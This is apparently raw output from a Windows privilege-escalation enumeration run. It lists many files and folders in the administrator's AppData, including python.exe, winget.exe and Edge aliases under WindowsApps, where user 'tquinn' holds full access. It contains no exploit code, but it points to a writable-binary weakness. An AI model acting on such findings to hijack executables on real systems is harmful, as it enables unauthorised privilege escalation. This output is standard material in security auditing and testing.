     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows Sidebar": tquinn [Allow: AllAccess]                                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Windows Sidebar\settings (1).ini": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\winget.exe": tquinn [Allow: AllAccess]                                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\WindowsPackageManagerServer.exe": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\Skype.exe": tquinn [Allow: AllAccess]                                                                                         
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\python3.exe": tquinn [Allow: AllAccess]                                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\python.exe": tquinn [Allow: AllAccess]                                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\MicrosoftEdge.exe": tquinn [Allow: AllAccess]                                                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps": tquinn [Allow: AllAccess]                                                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\GameBarElevatedFT_Alias.exe": tquinn [Allow: AllAccess]                                                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\GameBarElevatedFT_Alias.exe": tquinn [Allow: AllAccess]                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.SkypeApp_kzf8qxf38zg5c": tquinn [Allow: AllAccess]                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.SkypeApp_kzf8qxf38zg5c\Skype.exe": tquinn [Allow: AllAccess]                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe": tquinn [Allow: AllAccess]                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe": tquinn [Allow: AllAccess]                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\winget.exe": tquinn [Allow: AllAccess]                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\WindowsPackageManagerServer.exe": tquinn [Allow: AllAccess]                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python3.exe": tquinn [Allow: AllAccess]                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe": tquinn [Allow: AllAccess]                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python.exe": tquinn [Allow: AllAccess]                                            
     File Permissions "c:\users\administrator\AppData\Local\D3DSCache\f4d41c5d09ae781\F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.idx": tquinn [Allow: AllAccess]                                                      
     File Permissions "c:\users\administrator\AppData\Local\D3DSCache\f4d41c5d09ae781\F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.lock": tquinn [Allow: AllAccess]                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\D3DSCache\f4d41c5d09ae781": tquinn [Allow: AllAccess]                                                                                             
     File Permissions "c:\users\administrator\AppData\Local\D3DSCache\f4d41c5d09ae781\F4EB2D6C-ED2B-4BDD-AD9D-F913287E6768.val": tquinn [Allow: AllAccess]                                                      
     File Permissions "c:\users\administrator\AppData\Local\ConnectedDevicesPlatform\L.administrator\ActivitiesCache.db": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\ConnectedDevicesPlatform\L.administrator\ActivitiesCache.db-shm": tquinn [Allow: AllAccess]                                                         
     Folder Permissions "c:\users\administrator\AppData\Local\ConnectedDevicesPlatform\L.administrator": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\ConnectedDevicesPlatform\L.administrator\ActivitiesCache.db-wal": tquinn [Allow: AllAccess]                                                         
     File Permissions "c:\users\administrator\AppData\Local\ConnectedDevicesPlatform\CDPGlobalSettings.cdp": tquinn [Allow: AllAccess]                                                                          
     File Permissions "c:\users\administrator\AppData\Local\ConnectedDevicesPlatform\Connected Devices Platform certificates.sst": tquinn [Allow: AllAccess]                                                    
     File Permissions "c:\users\administrator\AppData\Local\ConnectedDevicesPlatform\L.administrator.cdp": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\ConnectedDevicesPlatform": tquinn [Allow: AllAccess]                                                                                              
     File Permissions "c:\users\administrator\AppData\Local\ConnectedDevicesPlatform\L.administrator.cdpresource": tquinn [Allow: AllAccess]                                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Comms\Unistore\data": tquinn [Allow: AllAccess]                                                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Comms\Unistore\data\AggregateCache.uca": tquinn [Allow: AllAccess]                                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Comms\UnistoreDB\store.jfm": tquinn [Allow: AllAccess]                                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Comms\UnistoreDB\store.vol": tquinn [Allow: AllAccess]                                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Comms\UnistoreDB\USS.jcp": tquinn [Allow: AllAccess]                                                                                                
     File Permissions "c:\users\administrator\AppData\Local\Comms\UnistoreDB\USS.jtx": tquinn [Allow: AllAccess]                                                                                                
     File Permissions "c:\users\administrator\AppData\Local\Comms\UnistoreDB\USSres00001.jrs": tquinn [Allow: AllAccess]                                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Comms\UnistoreDB\USSres00002.jrs": tquinn [Allow: AllAccess]                                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Comms\UnistoreDB": tquinn [Allow: AllAccess]                                                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Comms\UnistoreDB\USStmp.jtx": tquinn [Allow: AllAccess]                                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Temp\skype-preview Crashes\settings.dat": tquinn [Allow: AllAccess]                                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Temp\skype-preview Crashes\operation_log.txt": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Temp\skype-preview Crashes\metadata": tquinn [Allow: AllAccess]                                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Temp\skype-preview Crashes\CrashpadMetrics.pma": tquinn [Allow: AllAccess]                                                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Temp\skype-preview Crashes": tquinn [Allow: AllAccess]                                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Temp\skype-preview Crashes\CrashpadMetrics-active.pma": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Temp\cv_debug.log": tquinn [Allow: AllAccess]                                                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Temp\mat-debug-4252.log": tquinn [Allow: AllAccess]                                                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Temp\mat-debug-7812.log": tquinn [Allow: AllAccess]                                                                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Temp": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\AppData\Local\Temp\msedge_installer.log": tquinn [Allow: AllAccess]                                                                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                               
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\Settings\settings.dat.LOG2": tquinn [Allow: AllAccess]                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\Settings\settings.dat.LOG1": tquinn [Allow: AllAccess]                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                               
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WebpImageExtension_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Win32WebViewHost_cw5n1h2txyewy\Settings\settings.dat": tquinn [Allow: AllAccess]                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Win32WebViewHost_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                            
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Win32WebViewHost_cw5n1h2txyewy\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                               
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.CallingShellApp_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.CapturePicker_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\202914": tquinn [Allow: AllAccess]      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\280815": tquinn [Allow: AllAccess]      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\310091": tquinn [Allow: AllAccess]      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\310093": tquinn [Allow: AllAccess]      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\314559": tquinn [Allow: AllAccess]      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\338387": tquinn [Allow: AllAccess]      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\338388": tquinn [Allow: AllAccess]      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\338389": tquinn [Allow: AllAccess]      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353694": tquinn [Allow: AllAccess]      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\353698": tquinn [Allow: AllAccess]      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\88000045": tquinn [Allow: AllAccess]    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\88000161": tquinn [Allow: AllAccess]    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\88000163": tquinn [Allow: AllAccess]    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\88000165": tquinn [Allow: AllAccess]    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\ContentManagementSDK\Creatives\onesettings_waas_featuremanagement": tquinn [Allow: AllAccess]                                                                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\AC\INetCache": tquinn [Allow: AllAccess]                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\AC\INetCookies\ESE": tquinn [Allow: AllAccess]                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\AC\Microsoft\CryptnetUrlCache\Content": tquinn [Allow: AllAccess]                 
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\AC\Microsoft\CryptnetUrlCache\MetaData": tquinn [Allow: AllAccess]                
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\AC\TokenBroker\Cache": tquinn [Allow: AllAccess]                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Photos_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\TempState": tquinn [Allow: AllAccess]                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\ConstraintIndex\Settings_{72fa6944-1061-4ddf-9b7a-14dedfa1f9f8}": tquinn [Allow: AllAccess]                                                                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\ConstraintIndex\Settings_{1f525538-ceb8-4942-a57e-57d648a31007}": tquinn [Allow: AllAccess]                                                                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{89b0044f-6b00-4b24-87eb-f604e635bfa1}": tquinn [Allow: AllAccess]                                                                                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{75bc3462-f3fd-489a-a37c-d518d925905b}": tquinn [Allow: AllAccess]                                                                                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\ConstraintIndex\Apps_{cfc2678b-3a29-4d20-ad57-5226f841fe41}": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\ConstraintIndex\Apps_{859d31c6-c67b-4e50-bfb4-c73118c2e78d}": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\ConstraintIndex\Apps_{375e2d56-44f1-43dc-952b-fa0954b8fb82}": tquinn [Allow: AllAccess]
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\DeviceSearchCache": tquinn [Allow: AllAccess]                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AppData\CacheStorage": tquinn [Allow: AllAccess]                                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AppData\Indexed DB": tquinn [Allow: AllAccess]                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\AppCache": tquinn [Allow: AllAccess]                                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\AppCache\CT2XNY3E\3": tquinn [Allow: AllAccess]                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\AppCache\CT2XNY3E": tquinn [Allow: AllAccess]                                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache": tquinn [Allow: AllAccess]                                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\UB965RPK": tquinn [Allow: AllAccess]                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\HOFIY84P": tquinn [Allow: AllAccess]                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCookies\ESE": tquinn [Allow: AllAccess]                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetHistory\BackgroundTransferApiGroup": tquinn [Allow: AllAccess]                             
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetHistory\BackgroundTransferApi": tquinn [Allow: AllAccess]                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\Microsoft\Internet Explorer\DOMStore": tquinn [Allow: AllAccess]                               
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\Microsoft\Internet Explorer\DOMStore\ZAFHUPF9": tquinn [Allow: AllAccess]                      
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\Microsoft\CryptnetUrlCache\Content": tquinn [Allow: AllAccess]                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\Microsoft\CryptnetUrlCache\MetaData": tquinn [Allow: AllAccess]                                
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\TokenBroker\Cache": tquinn [Allow: AllAccess]                                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                         
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.SecureAssessmentBrowser_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\TempState": tquinn [Allow: AllAccess]                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\Settings": tquinn [Allow: AllAccess]                                                     
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsAlarms_8wekyb3d8bbwe\Settings\settings.dat.LOG2": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsAlarms_8wekyb3d8bbwe\Settings\settings.dat.LOG1": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsAlarms_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsAlarms_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsAlarms_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                    
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsCalculator_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsCalculator_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                           
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsCalculator_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsCamera_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsCamera_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\Microsoft.WindowsCamera_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\TempState": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\TempState\d5a8f02229be41efb047bd8f883ba799.db.ses": tquinn [Allow: AllAccess]            
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\Settings\settings.dat.LOG2": tquinn [Allow: AllAccess]                                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\Settings\settings.dat.LOG1": tquinn [Allow: AllAccess]                                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\Settings\settings.dat": tquinn [Allow: AllAccess]                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\Settings": tquinn [Allow: AllAccess]                                                   
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\Settings\roaming.lock": tquinn [Allow: AllAccess]                                        
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState\FileSystemLoggingCache.log": tquinn [Allow: AllAccess]                        
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState\HxCommAlwaysOnLog.etl": tquinn [Allow: AllAccess]                             
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState\HxCommAlwaysOnLog_Old.etl": tquinn [Allow: AllAccess]                         
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState\HxStore.hxd": tquinn [Allow: AllAccess]                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\INetCache": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\INetCache\container.dat": tquinn [Allow: AllAccess]                                   
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\INetCookies\ESE": tquinn [Allow: AllAccess]                                         
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\INetCookies\ESE\container.dat": tquinn [Allow: AllAccess]                             
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\INetHistory\BackgroundTransferApi": tquinn [Allow: AllAccess]                       
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\INetHistory\BackgroundTransferApi\container.dat": tquinn [Allow: AllAccess]           
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Microsoft\CryptnetUrlCache\Content\57C8EDB95DF3F0AD4EE2DC2B8CFD4157": tquinn [Allow: AllAccess]                                                                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Microsoft\CryptnetUrlCache\Content\77EC63BDA74BD0D0E0426DC8F8008506": tquinn [Allow: AllAccess]                                                                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Microsoft\CryptnetUrlCache\Content\80237EE4964FC9C409AAF55BF996A292_C5130A0BDC8C859A2757D77746C10868": tquinn [Allow: AllAccess]                                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Microsoft\CryptnetUrlCache\Content": tquinn [Allow: AllAccess]                      
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Microsoft\CryptnetUrlCache\Content\FB0D848F74F70BB2EAA93746D24D9749": tquinn [Allow: AllAccess]                                                                                               
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Microsoft\CryptnetUrlCache\MetaData\57C8EDB95DF3F0AD4EE2DC2B8CFD4157": tquinn [Allow: AllAccess]                                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Microsoft\CryptnetUrlCache\MetaData\77EC63BDA74BD0D0E0426DC8F8008506": tquinn [Allow: AllAccess]                                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Microsoft\CryptnetUrlCache\MetaData\80237EE4964FC9C409AAF55BF996A292_C5130A0BDC8C859A2757D77746C10868": tquinn [Allow: AllAccess]                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Microsoft\CryptnetUrlCache\MetaData": tquinn [Allow: AllAccess]                     
     File Permissions "c:\users\administrator\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\AC\Microsoft\CryptnetUrlCache\MetaData\FB0D848F74F70BB2EAA93746D24D9749": tquinn [Allow: AllAccess]                                                                                              
